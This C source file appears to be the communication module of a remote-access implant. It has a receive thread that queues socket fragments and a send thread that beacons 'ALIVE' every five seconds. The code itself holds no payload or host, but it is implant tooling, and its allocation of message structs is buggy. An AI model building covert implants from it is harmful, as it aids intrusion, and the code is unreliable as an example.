#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>

#include <sys/socket.h>

#include "utility.h"
#include "implant.h"
#include "queue.h"
#include "agent_comms.h"

// Global variables
// Receive Queue
extern struct Queue* agent_receive_queue;
extern pthread_mutex_t agent_receive_queue_lock;
// Send Queue
extern struct Queue* agent_send_queue;
extern pthread_mutex_t agent_send_queue_lock;

void *agent_receive(void *vargp){
	int *sockfd = (int*)vargp;
	Fragment fragment;
	char* buffer;
	
	for (;;){
		uint message_size = 0;
		uint bytes_received = 0;
		
		// get first chunk which contains total message size
		int nbytes = recv(*sockfd, (void*)&fragment, sizeof(Fragment), 0);
		if (nbytes <= 0){
			if (nbytes == 0){
				debug_print("%s\n", "connection closed");
			}
			else {
				printf("recv error\n");
			}
			exit(-1);
		}
		
		Queue_Message* message = malloc(sizeof(message));
		message->fragment = malloc(nbytes);
		message->id = -1;
		message->fragment_size = nbytes;
		memset(message->fragment, 0, nbytes);
		memcpy(message->fragment, &fragment, nbytes);
		
		enqueue(agent_receive_queue, &agent_receive_queue_lock, message);
	}
	return 0;	
}

void *agent_send(void *vargp){
	char *alive = "ALIVE\n";
	int *sockfd = (int*)vargp;
	uint message_size = 0;
	char buf[BUFFERSIZE];
	
	Fragment fragment;
	
	fragment.type = 0;
	fragment.index = 0;
	// set first 4 bytes of message to message size
	fragment.first_payload.total_size = strlen(alive);
	memcpy(fragment.first_payload.actual_payload, alive, strlen(alive));
	
	// size = type (4 bytes) + index (4 bytes) + payload size (4 bytes) + "ALIVE\n"
	message_size = sizeof(fragment.type) + sizeof(fragment.index) + sizeof(fragment.first_payload.total_size) + strlen(alive);
	
	for (;;){
		debug_print("sending fragment:\ttype: %d, index: %d, size: %d bytes\n", fragment.type, fragment.index, message_size);
		send(*sockfd, &fragment, message_size, 0);
		sleep(5);
	}
	return 0;	
}